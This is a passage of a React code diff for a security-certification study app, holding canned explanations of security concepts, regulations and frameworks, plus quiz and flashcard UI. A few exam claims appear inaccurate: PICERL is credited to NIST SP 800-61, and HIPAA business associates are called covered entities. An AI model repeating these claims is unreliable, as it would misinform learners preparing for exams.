+    "MITM Attack": "A Man-in-the-Middle attack occurs when an attacker secretly intercepts and potentially alters communications between two parties who believe they're communicating directly with each other.\n\nCommon techniques: ARP Poisoning (maps attacker's MAC to victim's IP on LAN), SSL Stripping (downgrades HTTPS to HTTP), DNS Spoofing (redirects domain to attacker IP), Evil Twin (rogue Wi-Fi access point).\n\nAttacker can: Eavesdrop on traffic, steal credentials, inject malicious content, or replay captured packets.\n\nPrevention: TLS/HTTPS encryption, certificate pinning, MFA, VPN on public Wi-Fi, DNSSEC.\n\nAnalogy: A postal worker who opens your mail, reads it, potentially modifies it, reseals it, and delivers it — neither party knows.\n\n🎯 EXAM TIP: ARP poisoning is the classic LAN-based MITM. SSL stripping = downgrade attack. On the exam, if you see 'intercepted traffic on public Wi-Fi,' think MITM and VPN as the solution.",
+    "Zero-Day": "A zero-day vulnerability is a software flaw that is unknown to the vendor and therefore has no available patch. The term means the vendor has had 'zero days' to fix it. Zero-day exploits are extremely valuable — governments and criminal organizations pay millions for them.\n\nLifecycle: Flaw exists → attacker discovers it → exploits it (zero-day window) → vendor discovers it → patch released → patch deployed (end of zero-day).\n\nMitigation (since no patch exists): Defense in depth, network segmentation, IDS/IPS behavior-based detection, application whitelisting, least privilege, threat intelligence feeds.\n\nAnalogy: A secret unlocked door in a building that even the building owner doesn't know exists — until someone walks through it.\n\n🎯 EXAM TIP: Zero-days CANNOT be patched (patch doesn't exist yet). The exam will ask how to MITIGATE (not fix) them. Answers: IDS/IPS, segmentation, least privilege — not 'apply patches.'",
+    "APT": "An Advanced Persistent Threat is a sophisticated, long-term cyberattack campaign, typically carried out by nation-state actors or organized criminal groups. The key characteristics: Advanced (sophisticated tools, zero-days, custom malware), Persistent (maintains access for months/years), Threat (clear objective — espionage, sabotage, financial theft).\n\nAPT lifecycle: Reconnaissance → Initial Compromise → Establish Foothold → Escalate Privileges → Internal Recon → Move Laterally → Maintain Presence → Complete Mission.\n\nExamples: APT28 (Russia/Fancy Bear), APT41 (China), Lazarus Group (North Korea).\n\nIndicators: Unusual outbound traffic, lateral movement, data staging, use of legitimate tools (living off the land).\n\n🎯 EXAM TIP: APTs prioritize STEALTH over speed. They use legitimate tools (PowerShell, WMI) to blend in — called 'living off the land.' Detection requires behavioral analytics (UEBA) and SIEM correlation, not just signature-based AV.",
+    "Buffer Overflow": "A buffer overflow occurs when a program writes more data to a buffer (fixed-size memory block) than it can hold, overwriting adjacent memory. Attackers craft input that overwrites the return address on the stack, redirecting program execution to malicious code (shellcode).\n\nTypes: Stack overflow (most common), Heap overflow, Integer overflow.\n\nHistorical impact: One of the oldest and most exploited vulnerability types — Morris Worm (1988) used it.\n\nPrevention: Input validation and bounds checking (development), ASLR (Address Space Layout Randomization — randomizes memory locations), DEP/NX bit (marks memory regions non-executable), stack canaries (detects overwrites), use memory-safe languages (Rust, Go).\n\n🎯 EXAM TIP: Know the mitigations: ASLR randomizes addresses (makes exploitation harder), DEP/NX prevents code execution from data regions, stack canaries detect overflow attempts. These are OS-level controls, not application-level.",
+    "Threat Intelligence": "Threat Intelligence is evidence-based knowledge about existing or emerging threats used to make informed security decisions. It transforms raw data into actionable insights.\n\nFour types: Strategic (high-level trends for executives — 'nation-state attacks increasing'), Tactical (TTPs — attacker techniques, tools, procedures), Operational (specific upcoming attack details — rare, from human intelligence), Technical (IOCs — IPs, domains, hashes, signatures — fed into SIEM/firewalls).\n\nSources: ISACs (industry sharing), government feeds (CISA, FBI), commercial threat intel platforms (CrowdStrike, Recorded Future), OSINT, dark web monitoring.\n\nIOC = Indicator of Compromise (evidence of breach). TTP = Tactics, Techniques, Procedures (HOW attackers operate — MITRE ATT&CK framework).\n\n🎯 EXAM TIP: Know the four types and what audience each serves. Technical IOCs are machine-readable and automated. Strategic intel goes to the C-suite. MITRE ATT&CK is the framework for documenting TTPs.",
+    "DMZ": "A Demilitarized Zone is a network segment that sits between the untrusted internet and the trusted internal network, creating a buffer zone. It hosts public-facing services that must be accessible from the internet while protecting internal resources.\n\nTypical DMZ residents: Web servers, email servers (MTA), DNS servers, FTP servers, reverse proxies, VPN concentrators.\n\nArchitecture: Usually implemented with TWO firewalls — one between internet and DMZ, one between DMZ and internal network (most secure), or a single firewall with three interfaces.\n\nKey principle: If a DMZ server is compromised, the attacker still faces the internal firewall. Internal servers should NEVER be directly accessible from the DMZ.\n\nAnalogy: A hotel lobby — public access allowed, but locked doors separate it from the private areas.\n\n🎯 EXAM TIP: DMZ = buffer zone for public services. Two-firewall DMZ is more secure than single-firewall. The screened subnet is another name for DMZ.",
+    "Zero Trust": "Zero Trust is a security model that eliminates implicit trust based on network location. The core principle: 'Never trust, always verify.' Even users INSIDE the network must be authenticated and authorized for every resource access.\n\nKey pillars: Strong identity verification (MFA required), device health validation, least privilege access, micro-segmentation, continuous monitoring and validation, assume breach mentality.\n\nWhy it matters: Traditional perimeter security assumed internal traffic was safe. With remote work, cloud, and insider threats, the perimeter no longer exists.\n\nKey technologies: IAM, MFA, PAM, micro-segmentation, SASE (Secure Access Service Edge), continuous authentication.\n\nNIST SP 800-207 is the Zero Trust architecture standard.\n\n🎯 EXAM TIP: Zero Trust ≠ a product, it's an ARCHITECTURE/PHILOSOPHY. Key phrase: 'never trust, always verify.' The opposite of Zero Trust is the old castle-and-moat model (trust everything inside the perimeter).",
+    "VLAN": "A Virtual LAN is a logical grouping of network devices regardless of their physical location, created through switch configuration. VLANs segment a network without requiring separate physical switches.\n\nBenefits: Security (isolates sensitive systems), reduced broadcast domains (improves performance), easier management, cost savings (one physical switch can host multiple VLANs).\n\nVLAN hopping: An attack where an attacker gains access to other VLANs via switch spoofing or double tagging. Mitigated by disabling DTP, setting native VLANs to unused IDs.\n\nTrunk ports carry traffic for multiple VLANs (tagged). Access ports carry traffic for one VLAN (untagged).\n\nAnalogy: One large office building physically divided into separate departments that can't see each other's internal communications.\n\n🎯 EXAM TIP: VLANs provide logical segmentation but are NOT a complete security solution — inter-VLAN routing requires a firewall/router. VLAN hopping is a real attack — know the mitigations.",
+    "Cloud Models": "There are three service models and four deployment models to know.\n\nService Models (shared responsibility): IaaS (Infrastructure as a Service) — vendor provides hardware/network, you manage OS, middleware, apps, data (e.g., AWS EC2). PaaS (Platform as a Service) — vendor manages OS and runtime, you manage apps and data (e.g., Heroku, Google App Engine). SaaS (Software as a Service) — vendor manages everything, you manage data and user access (e.g., Office 365, Salesforce).\n\nDeployment Models: Public (shared infrastructure), Private (dedicated), Hybrid (mix), Community (shared between similar orgs).\n\nShared Responsibility: The line between vendor and customer responsibility shifts with each model. IaaS = most customer responsibility. SaaS = least.\n\n🎯 EXAM TIP: Memorize which model gives you the LEAST control (SaaS) and MOST control (IaaS). On-premises = 100% your responsibility. The shared responsibility model is heavily tested.",
+    "Firewall Types": "Know all five types for the exam: Packet Filtering — examines IP/port headers only (Layer 3-4), no state tracking, fast but limited. Stateful Inspection — tracks connection state (knows if a packet is part of an established session), more secure. Application/Proxy — operates at Layer 7, understands application protocols (HTTP, FTP), can inspect content. Next-Generation Firewall (NGFW) — combines stateful + application awareness + IDS/IPS + TLS inspection + threat intelligence. WAF (Web Application Firewall) — specialized for HTTP/HTTPS, protects against OWASP Top 10 (SQLi, XSS).\n\nFirewall rule processing: Top-down, first match wins. Implicit deny at the end (block everything not explicitly allowed).\n\n🎯 EXAM TIP: NGFW is the most comprehensive. WAF ≠ NGFW — WAF is application-specific. Stateful > stateless (packet filtering). Implicit deny is the default last rule.",
+    "Micro-segmentation": "Micro-segmentation is a granular network security technique that divides a network into small, isolated zones — even down to individual workloads or VMs — and applies security policies to each segment independently.\n\nWhy it matters: Traditional segmentation (VLANs/subnets) stops north-south traffic but allows east-west lateral movement. Micro-segmentation restricts lateral movement WITHIN a network — critical for containing breaches.\n\nImplementation: Software-defined networking (SDN), hypervisor-based controls, cloud security groups (AWS Security Groups), Zero Trust Network Access.\n\nBenefit: If an attacker compromises one workload, they cannot easily reach adjacent systems without re-authenticating.\n\nAnalogy: Instead of one giant room with a locked front door, every desk has its own locked cage.\n\n🎯 EXAM TIP: Micro-segmentation is a key Zero Trust enabler. If a question mentions limiting LATERAL MOVEMENT or east-west traffic, think micro-segmentation.",
+    "VPN Types": "VPNs create encrypted tunnels over untrusted networks. Know these types: Site-to-Site VPN — permanently connects two networks (e.g., branch office to HQ), uses IPSec, transparent to users. Remote Access VPN — connects individual users to a corporate network, requires client software or SSL/TLS browser-based access. Split Tunneling — only corporate traffic goes through VPN; internet traffic goes direct (less secure but better performance). Full Tunnel — ALL traffic routed through VPN.\n\nProtocols: IPSec (Tunnel mode encrypts entire packet; Transport mode encrypts payload only). SSL/TLS VPN (runs over HTTPS port 443, firewall-friendly). OpenVPN, WireGuard (modern, fast).\n\nOld/insecure: PPTP (broken — avoid), L2TP alone (no encryption — pair with IPSec).\n\n🎯 EXAM TIP: IPSec Tunnel mode = encrypts entire original IP packet (used in site-to-site). Transport mode = encrypts payload only. PPTP = insecure. Split tunneling = security risk.",
+    "SD-WAN": "Software-Defined WAN uses software to centrally control and manage WAN connections across multiple locations, replacing traditional router-centric WANs. It abstracts the underlying transport (MPLS, broadband, LTE) and applies policies centrally.\n\nSecurity relevance: SD-WAN can integrate security functions (firewall, IDS/IPS, CASB) directly into the WAN fabric — enabling SASE (Secure Access Service Edge) architecture.\n\nBenefits: Centralized policy management, dynamic traffic routing, cost reduction vs MPLS, built-in encryption, improved visibility.\n\nSASE combines SD-WAN with cloud-delivered security services (CASB, SWG, ZTNA, FWaaS) into one platform.\n\nAnalogy: A smart GPS that dynamically routes traffic across multiple roads based on congestion, rather than a fixed route.\n\n🎯 EXAM TIP: SD-WAN is tested in the context of cloud security and SASE. Know that SASE = SD-WAN + security services (Zero Trust Network Access, CASB, SWG) delivered from the cloud.",
+    "PICERL": "PICERL is the incident response lifecycle defined by NIST SP 800-61. Each phase has specific goals:\n\nPreparation: Build IR capability BEFORE incidents — playbooks, tools, training, communication plans. Identification: Detect and confirm the incident — is this an actual incident or false positive? Scope it. Containment: Stop the spread — short-term (isolate host) and long-term (patch, rebuild). Eradication: Remove the threat — delete malware, close vulnerabilities, reset compromised credentials. Recovery: Restore systems to normal — validate, monitor closely for re-infection. Lessons Learned: Post-incident review — what went wrong? What worked? Update playbooks.\n\nKey rule: NEVER skip Lessons Learned — it's how defenses improve.\n\n🎯 EXAM TIP: The exam loves to test the ORDER. Memorize: P-I-C-E-R-L. Containment comes BEFORE Eradication. Don't jump to recovery without eradication. Lessons Learned is phase 6, not optional.",
+    "SIEM": "Security Information and Event Management centralizes log collection, aggregation, correlation, and alerting from across an organization's entire infrastructure.\n\nCore functions: Log aggregation (collects from firewalls, endpoints, servers, cloud), Normalization (converts logs to common format), Correlation (identifies patterns across multiple sources), Alerting (triggers on rule matches), Dashboards and reporting (compliance, forensics).\n\nSIEM vs SOAR: SIEM detects and alerts. SOAR (Security Orchestration, Automation and Response) automates the response actions triggered by SIEM alerts.\n\nUse cases: Detecting brute force (multiple failed logins), lateral movement, data exfiltration, compliance reporting (PCI-DSS, HIPAA).\n\nAnalogy: A security operations center that reads thousands of security camera feeds simultaneously and alerts guards only when something suspicious is detected.\n\n🎯 EXAM TIP: SIEM = centralized log correlation and alerting. SOAR = automated response to SIEM alerts. Together they form a modern SOC. Know that SIEM helps with compliance reporting.",
+    "Chain of Custody": "Chain of custody is the chronological documentation of the collection, handling, transfer, and storage of evidence in a forensic investigation. It proves that evidence was not tampered with, altered, or contaminated from collection to court presentation.\n\nKey requirements: Document WHO collected evidence, WHEN, WHERE, and HOW. Each person who handles evidence must sign. Evidence must be stored securely (evidence bags, write blockers for digital media). Any break in chain of custody can make evidence inadmissible in court.\n\nDigital forensics tools: Write blockers (prevent modification of original media), forensic images (bit-for-bit copies — work on copies, never originals), hash verification (MD5/SHA-256 before and after imaging).\n\n🎯 EXAM TIP: Chain of custody protects the LEGAL ADMISSIBILITY of evidence. Working on original media (instead of forensic copies) breaks chain of custody. Hash values before/after imaging prove the copy is identical to the original.",
+    "Least Privilege": "The principle of least privilege states that every user, process, and system should have access to ONLY the resources and permissions required to perform their specific job — nothing more.\n\nImplementation: Role-based access control (RBAC), need-to-know access, regular access reviews (recertification), disabling default accounts, removing admin rights from standard users.\n\nRelated concept: Privilege creep — when users accumulate permissions over time as they change roles. Prevented by periodic access reviews.\n\nSeparation of duties: No single person should have enough access to commit and conceal fraud alone (e.g., the person who approves payments shouldn't be the one who processes them).\n\nAnalogy: A janitor has keys to cleaning supply rooms — not the CEO's office or the data center.\n\n🎯 EXAM TIP: Least privilege limits BLAST RADIUS — if an account is compromised, damage is contained. It's also the primary defense against insider threats. Privilege creep is fixed by access recertification.",
+    "PAM": "Privileged Access Management is a security solution that controls, monitors, and audits access by privileged users — accounts with elevated permissions such as domain admins, root accounts, and service accounts.\n\nKey features: Password vaulting (stores privileged credentials securely, rotates them automatically), Session recording (full video/keystroke logging of admin sessions), Just-in-time access (grants elevated privileges only when needed, for limited time), Least privilege enforcement, Dual control (two admins required for sensitive actions).\n\nWhy it matters: Privileged accounts are the crown jewels — compromising an admin account gives attackers full control. 80% of breaches involve privileged credential abuse.\n\nPopular solutions: CyberArk, BeyondTrust, Delinea.\n\n🎯 EXAM TIP: PAM = controlling PRIVILEGED accounts specifically (not all accounts — that's IAM). Just-in-time access is a key PAM feature. Session recording provides non-repudiation for admin actions.",
+    "EDR": "Endpoint Detection and Response is a security solution that continuously monitors endpoints (laptops, servers, mobile devices) for malicious activity, records detailed telemetry, and provides investigation and automated response capabilities.\n\nCapabilities: Real-time behavioral monitoring, threat hunting, automated containment (isolate endpoint), forensic investigation, root cause analysis, rollback capabilities.\n\nEDR vs Traditional AV: AV uses signatures (known malware only). EDR uses behavioral analysis (detects unknown/zero-day threats). EDR also records what happened before/during/after an attack for forensics.\n\nXDR (Extended Detection and Response) = EDR extended across network, cloud, email, and identity.\n\nMDR (Managed Detection and Response) = EDR with a human team running it as a service.\n\n🎯 EXAM TIP: EDR is behavioral, not signature-based. If a question asks how to detect unknown malware on endpoints, EDR is the answer. Know the XDR and MDR extensions. EDR generates the telemetry that feeds into SIEM.",
+    "SOAR": "Security Orchestration, Automation, and Response platforms automate repetitive security tasks and coordinate the response to security incidents across multiple tools and teams.\n\nThree components: Orchestration (connects and coordinates security tools — SIEM, firewall, EDR, ticketing), Automation (executes predefined response actions without human intervention), Response (structured workflows called playbooks that guide incident response).\n\nExample workflow: SIEM detects brute force → SOAR automatically blocks source IP in firewall, disables the targeted account, creates a ticket, and notifies the analyst — all within seconds.\n\nBenefit: Drastically reduces Mean Time to Respond (MTTR) and reduces alert fatigue by handling low-level incidents automatically.\n\n🎯 EXAM TIP: SIEM detects, SOAR responds. SOAR uses PLAYBOOKS to automate IR steps. If the question mentions reducing alert fatigue or automating incident response, the answer is SOAR.",
+    "Digital Forensics": "Digital forensics is the process of collecting, preserving, analyzing, and presenting digital evidence in a legally sound manner.\n\nOrder of volatility (collect most volatile FIRST): CPU registers and cache → RAM → Swap/pagefile → Network connections → Running processes → Disk storage → Logs → Archived media.\n\nKey practices: Never work on original media (use forensic copies). Verify integrity with hash values (SHA-256) before and after imaging. Use write blockers when capturing disk images. Document everything (chain of custody). Maintain legal hold notices to preserve relevant data.\n\nForensic imaging tools: FTK Imager, dd (Linux), Autopsy.\n\nLegal considerations: Search warrants, proper authorization, rules of evidence.\n\n🎯 EXAM TIP: Order of volatility is heavily tested — RAM before disk, always. The reason: volatile data (RAM, connections) is lost when the system powers off. Forensic copy ≠ regular file copy (must be bit-for-bit with hash verification).",
+    "Risk Formula": "Risk is the likelihood that a threat will exploit a vulnerability and cause harm. The basic formula: Risk = Threat × Vulnerability × Impact.\n\nKey terms: Threat — something that COULD cause harm (hurricane, hacker, employee). Vulnerability — a weakness that COULD be exploited. Impact — the damage if exploitation occurs. Likelihood — probability a threat exploits a vulnerability. Risk appetite — how much risk an org is willing to accept.\n\nFour risk responses: Accept (live with it — risk is within appetite), Avoid (stop the risky activity), Transfer (shift to third party — insurance, outsourcing), Mitigate (reduce likelihood or impact through controls).\n\nQuantitative risk: Annual Loss Expectancy (ALE) = Single Loss Expectancy (SLE) × Annual Rate of Occurrence (ARO).\n\n🎯 EXAM TIP: Know all four risk responses and when each applies. ALE = SLE × ARO is a calculation the exam tests. Risk transference = insurance. Residual risk = risk remaining after controls are applied.",
+    "BCP vs DRP": "Business Continuity Plan (BCP) and Disaster Recovery Plan (DRP) are related but distinct:\n\nBCP: Focuses on keeping BUSINESS OPERATIONS running during a disruption — not just IT. Covers personnel, facilities, communications, supply chain, and manual workarounds. BCP is the broader plan.\n\nDRP: Focuses on restoring IT SYSTEMS and technology infrastructure after a disaster. A subset of BCP. Covers data recovery, system restoration, failover procedures.\n\nKey metrics: RTO (Recovery Time Objective) — maximum acceptable downtime. RPO (Recovery Point Objective) — maximum acceptable data loss. MTD (Maximum Tolerable Downtime) — point beyond which business cannot recover. MTTR (Mean Time to Repair) — average time to fix a system.\n\n🎯 EXAM TIP: BCP = whole business continuity (people, process, technology). DRP = IT systems recovery. DRP is a COMPONENT of BCP. Lower RTO/RPO = more expensive to achieve (more redundancy required).",
+    "RTO vs RPO": "These two metrics define recovery requirements and directly drive the cost of resilience:\n\nRTO (Recovery Time Objective): The maximum time a system can be DOWN before causing unacceptable business impact. Example: 'Our payment system must be restored within 4 hours.' Drives: hot/warm/cold site decisions, failover automation.\n\nRPO (Recovery Point Objective): The maximum amount of DATA LOSS acceptable, measured in time. Example: 'We can afford to lose no more than 1 hour of transaction data.' Drives: backup frequency, replication strategy.\n\nSite types based on RTO: Hot site (real-time replication, near-zero RTO, most expensive). Warm site (partially configured, hours of RTO). Cold site (empty facility, days/weeks to activate, cheapest).\n\n🎯 EXAM TIP: RTO = time (how fast to restore). RPO = data (how much loss is OK). Lower both = more expensive. Hot site = lowest RTO. Backup frequency is driven by RPO.",
+    "GDPR": "The General Data Protection Regulation is an EU privacy law (effective May 2018) that applies to any organization processing personal data of EU residents — regardless of where the organization is based.\n\nKey requirements: Lawful basis for processing (consent, contract, legitimate interest). Data minimization (collect only what's necessary). Purpose limitation (use data only for stated purposes). Breach notification within 72 hours to supervisory authority. Data Subject Rights: right to access, rectification, erasure ('right to be forgotten'), portability, object. Data Protection Officer (DPO) required for large-scale processing. Privacy by Design.\n\nPenalties: Up to €20 million or 4% of global annual revenue (whichever is higher).\n\n🎯 EXAM TIP: Know the 72-hour breach notification requirement, right to erasure, and that GDPR applies globally if you process EU data. It does NOT require explicit consent for all processing — only one of six lawful bases is needed.",
+    "HIPAA": "The Health Insurance Portability and Accountability Act is a US law protecting Protected Health Information (PHI) — any information that identifies an individual and relates to their health condition, healthcare provision, or payment.\n\nThree safeguard categories: Administrative (policies, training, workforce management), Physical (facility access controls, workstation security, device disposal), Technical (encryption, access controls, audit controls, transmission security).\n\nKey rules: Privacy Rule (who can access/use PHI), Security Rule (technical safeguards for electronic PHI/ePHI), Breach Notification Rule (notify affected individuals, HHS, and media within 60 days for large breaches).\n\nBusiness Associates (vendors who handle PHI) must sign Business Associate Agreements (BAAs).\n\n🎯 EXAM TIP: HIPAA covers PHI specifically. The three safeguard types (administrative, physical, technical) are exam favorites. Breach notification = 60 days (vs GDPR's 72 hours). Business Associates are covered entities too.",
+    "PCI-DSS": "Payment Card Industry Data Security Standard is a contractual requirement (not law) for any organization that stores, processes, or transmits cardholder data. Maintained by the PCI Security Standards Council (Visa, Mastercard, etc.).\n\n12 core requirements grouped into 6 goals: Build and maintain secure networks (firewalls, no vendor defaults). Protect cardholder data (encrypt stored data, protect transmission). Vulnerability management (AV, patches). Strong access controls (least privilege, MFA, unique IDs). Monitor and test networks (logging, IDS, penetration testing). Information security policy.\n\nCompliance levels based on transaction volume (Level 1 = highest volume, most rigorous).\n\nKey controls: Encrypt PAN (Primary Account Number) at rest and in transit. Never store CVV after authorization. Network segmentation reduces audit scope.\n\n🎯 EXAM TIP: PCI-DSS = payment card data protection. It's a contractual standard, not a law. Segmenting cardholder data environment reduces PCI scope. Merchants can face card network fines (not criminal penalties).",
+    "NIST CSF": "The NIST Cybersecurity Framework is a voluntary framework developed by the National Institute of Standards and Technology providing guidance on managing cybersecurity risk. Widely adopted across industries and government.\n\nFive core functions (in order): IDENTIFY — understand your assets, risks, and governance. PROTECT — implement controls to limit impact. DETECT — develop capabilities to identify cybersecurity events. RESPOND — take action on detected incidents. RECOVER — restore capabilities after incidents.\n\nThe framework has three tiers (1=Partial to 4=Adaptive) indicating maturity.\n\nDon't confuse with IR lifecycle (PICERL) — NIST CSF is a RISK MANAGEMENT framework, not just incident response.\n\nCSF 2.0 added a 6th function: GOVERN (cybersecurity governance and strategy).\n\n🎯 EXAM TIP: NIST CSF = Identify, Protect, Detect, Respond, Recover (+ Govern in v2.0). Don't mix up with PICERL (incident response). NIST CSF is voluntary but widely required by regulators.",
+    "Security Awareness": "Security awareness training transforms the human layer — often the weakest link — into an active security control. It addresses the reality that most breaches involve human error or social engineering.\n\nKey components: Phishing simulations (send fake phishing emails, track who clicks, train offenders), Security policy training (acceptable use, password policies, data handling), Role-based training (different content for admins vs regular users), Social engineering recognition, Physical security (tailgating, clean desk, screen locking).\n\nMetrics: Click rate on simulated phishing (decreasing = success), policy acknowledgment rates, security incident reporting rates.\n\nBest practices: Frequent short sessions over annual marathons, make it relevant to the employee's actual role, reinforce with simulated attacks.\n\n🎯 EXAM TIP: Security awareness is a COMPENSATING control — it reduces risk but can't eliminate it. Phishing simulation is the most effective awareness tool. When the exam asks the WEAKEST link in security, the answer is always the human element.",
+  };
+
+  const askAI = (concept) => {
+    const explanation = DEEP_EXPLAIN[concept.term];
+    setAiText(explanation || "Deep explanation coming soon for this term. Review the definition above and cross-reference with your study guide.");
+  };
+
+  const domainColor = domain ? domain.color : C.accent;
+
+  return (
+    <div>
+      {/* progress bar */}
+      <div style={{display:"flex",alignItems:"center",gap:10,marginBottom:10}}>
+        <div style={{flex:1,height:4,background:C.border,borderRadius:2,overflow:"hidden"}}>
+          <div style={{height:"100%",width:`${totalPct}%`,background:`linear-gradient(90deg,#00f5c4,#0ea5e9)`,transition:"width 0.5s"}}/>
+        </div>
+        <span style={{fontSize:11,fontWeight:700,color:totalPct>=70?C.green:C.yellow}}>{totalPct}%</span>
+      </div>
+      {/* mode tabs */}
+      <div style={{display:"flex",gap:5,marginBottom:14}}>
+        {MODES.map(m=>(
+          <button key={m} onClick={()=>{setMode(m);setSelDomain(null);setAiText("");}}
+            style={{flex:1,padding:"6px 0",fontSize:10,fontWeight:700,border:"1px solid",cursor:"pointer",borderRadius:4,fontFamily:"'Courier New', monospace",letterSpacing:"0.05em",
+              borderColor:mode===m?"#00f5c4":C.border,
+              background:mode===m?"rgba(0,245,196,0.1)":"transparent",
+              color:mode===m?"#00f5c4":C.muted}}>
+            {m.toUpperCase()}
+          </button>
+        ))}
+      </div>
+
+      {/* DOMAIN GRID */}
+      {mode!=="Study Plan" && !selDomain && (
+        <div>
+          <div style={{fontSize:10,color:C.muted,marginBottom:10,letterSpacing:"0.1em"}}>SELECT DOMAIN</div>
+          {DOMAINS.map(d=>(
+            <div key={d.id} onClick={()=>{setSelDomain(d.id);setConceptPage(0);setAiText("");setQuizState({qi:0,selected:null,showAnswer:false,score:0,finished:false});}}
+              style={{background:C.panel,border:`1px solid ${progress[d.id]>0?d.color+"44":C.border}`,borderRadius:8,padding:"11px 13px",marginBottom:9,cursor:"pointer",position:"relative",overflow:"hidden"}}>
+              <div style={{position:"absolute",top:0,left:0,height:"100%",width:`${progress[d.id]}%`,background:`${d.color}0d`,transition:"width 0.5s"}}/>
+              <div style={{position:"relative"}}>
+                <div style={{display:"flex",alignItems:"center",gap:7,marginBottom:4}}>
+                  <span style={{fontSize:15}}>{d.icon}</span>
+                  <span style={{fontSize:11,fontWeight:700,color:d.color}}>{d.name}</span>
+                  <span style={{marginLeft:"auto",fontSize:10,color:C.muted}}>{d.weight}%</span>
+                  {progress[d.id]>0&&<span style={{fontSize:10,fontWeight:700,color:d.color}}>{progress[d.id]}%</span>}
+                </div>
+                <div style={{display:"flex",flexWrap:"wrap",gap:3}}>
+                  {d.topics.map(t=><span key={t} style={{fontSize:9,background:C.border,color:C.muted,borderRadius:3,padding:"2px 5px"}}>{t}</span>)}
+                </div>
+              </div>
+            </div>
+          ))}
+        </div>
+      )}
+
+      {/* QUIZ */}
+      {mode==="Quiz" && selDomain && !quizState.finished && (
+        <div>
+          <button onClick={()=>setSelDomain(null)} style={{background:"none",border:"none",color:C.muted,cursor:"pointer",fontSize:10,marginBottom:10,fontFamily:"inherit",padding:0}}>← BACK</button>
+          <div style={{display:"flex",gap:3,marginBottom:14}}>
+            {questions.map((_,i)=><div key={i} style={{flex:1,height:3,borderRadius:2,background:i<quizState.qi?domainColor:i===quizState.qi?domainColor+"88":C.border}}/>)}
+          </div>
+          <div style={{fontSize:10,color:C.muted,marginBottom:6}}>Q{quizState.qi+1} OF {questions.length}</div>
+          <div style={{fontSize:13,fontWeight:600,lineHeight:1.6,marginBottom:14,color:C.bright}}>{questions[quizState.qi].q}</div>
+          {questions[quizState.qi].options.map((opt,i)=>{
+            const isSel=quizState.selected===i, isAns=i===questions[quizState.qi].answer;
+            let bg="transparent",border=C.border,color=C.text;
+            if(quizState.showAnswer){ if(isAns){bg=`${domainColor}15`;border=domainColor;color=domainColor;}else if(isSel){bg="#200505";border=C.red;color=C.red;} }
+            else if(isSel){bg=`${domainColor}10`;border=domainColor;color=domainColor;}
+            return(
+              <div key={i} onClick={()=>handleAnswer(i)}
+                style={{background:bg,border:`1px solid ${border}`,borderRadius:5,padding:"9px 11px",marginBottom:7,cursor:quizState.showAnswer?"default":"pointer",color,fontSize:11,lineHeight:1.5,transition:"all 0.15s"}}>
+                <span style={{marginRight:6,opacity:0.4}}>{String.fromCharCode(65+i)}.</span>{opt}
+              </div>
+            );
+          })}
+          {quizState.showAnswer&&(
+            <div style={{background:"#060c18",border:`1px solid ${C.border}`,borderRadius:5,padding:10,marginBottom:10}}>
+              <div style={{fontSize:9,color:C.muted,marginBottom:3}}>EXPLANATION</div>
+              <div style={{fontSize:11,color:C.text,lineHeight:1.6}}>{questions[quizState.qi].explanation}</div>
+            </div>
+          )}
+          {quizState.showAnswer&&(
+            <button onClick={nextQ} style={{width:"100%",padding:"10px",background:domainColor,color:"#0a0e1a",border:"none",borderRadius:5,fontWeight:700,fontSize:11,cursor:"pointer",fontFamily:"inherit"}}>
+              {quizState.qi+1>=questions.length?"SEE RESULTS":"NEXT →"}
+            </button>
+          )}
+        </div>
+      )}
+
+      {/* QUIZ RESULTS */}
+      {mode==="Quiz" && selDomain && quizState.finished && (
+        <div style={{textAlign:"center",paddingTop:16}}>
+          <div style={{fontSize:40,marginBottom:8}}>{quizState.score===questions.length?"🎯":quizState.score>=questions.length*0.7?"✅":"📚"}</div>
+          <div style={{fontSize:32,fontWeight:700,color:domainColor,marginBottom:4}}>{quizState.score}/{questions.length}</div>
+          <div style={{fontSize:11,color:C.muted,marginBottom:20}}>{Math.round((quizState.score/questions.length)*100)}% — {domain.name}</div>
+          <button onClick={()=>startQuiz(selDomain)} style={{display:"block",width:"100%",padding:"10px",background:domainColor,color:"#0a0e1a",border:"none",borderRadius:5,fontWeight:700,fontSize:11,cursor:"pointer",fontFamily:"inherit",marginBottom:7}}>RETRY</button>
+          <button onClick={()=>setSelDomain(null)} style={{display:"block",width:"100%",padding:"10px",background:"transparent",color:C.muted,border:`1px solid ${C.border}`,borderRadius:5,fontWeight:700,fontSize:11,cursor:"pointer",fontFamily:"inherit"}}>CHOOSE DOMAIN</button>
+        </div>
+      )}
+
+      {/* CONCEPTS */}
+      {mode==="Concepts" && selDomain && (
+        <div>
+          <button onClick={()=>{setSelDomain(null);setAiText("");}} style={{background:"none",border:"none",color:C.muted,cursor:"pointer",fontSize:10,marginBottom:10,fontFamily:"inherit",padding:0}}>← BACK</button>
+          <div style={{background:C.panel,border:`1px solid ${domainColor}44`,borderRadius:7,padding:14,marginBottom:10}}>
+            <div style={{fontSize:15,fontWeight:700,color:domainColor,marginBottom:7}}>{concepts[conceptPage].term}</div>
+            <div style={{fontSize:12,color:C.text,lineHeight:1.7}}>{concepts[conceptPage].def}</div>
+          </div>
+          <button onClick={()=>askAI(concepts[conceptPage])}
+            style={{width:"100%",padding:"9px",background:"rgba(0,245,196,0.07)",color:"#00f5c4",border:"1px solid #00f5c433",borderRadius:5,fontSize:10,cursor:"pointer",fontFamily:"inherit",fontWeight:700,marginBottom:9,letterSpacing:"0.05em"}}>
+            ✨ DEEP EXPLAIN
+          </button>
+          {aiText&&(
+            <div style={{background:"#060d18",border:`1px solid ${C.border}`,borderRadius:5,padding:11,marginBottom:10}}>
+              <div style={{fontSize:9,color:"#00f5c4",marginBottom:5}}>AI COACH</div>
+              <div style={{fontSize:11,color:C.text,lineHeight:1.7}}>{aiText}</div>
+            </div>
+          )}
+          <div style={{display:"flex",gap:7,alignItems:"center",marginBottom:14}}>
+            <button onClick={()=>{setConceptPage(p=>Math.max(0,p-1));setAiText("");}} disabled={conceptPage===0}
+              style={btn(C.muted,conceptPage===0)}>← PREV</button>
+            <div style={{flex:1,textAlign:"center",fontSize:10,color:C.muted}}>{conceptPage+1}/{concepts.length}</div>
+            <button onClick={()=>{setConceptPage(p=>Math.min(concepts.length-1,p+1));setAiText("");}} disabled={conceptPage===concepts.length-1}
+              style={btn(domainColor,conceptPage===concepts.length-1)}>NEXT →</button>
+          </div>
+          <div style={{fontSize:9,color:C.muted,marginBottom:7,letterSpacing:"0.08em"}}>ALL TERMS</div>
+          {concepts.map((c,i)=>(
+            <div key={i} onClick={()=>{setConceptPage(i);setAiText("");}}
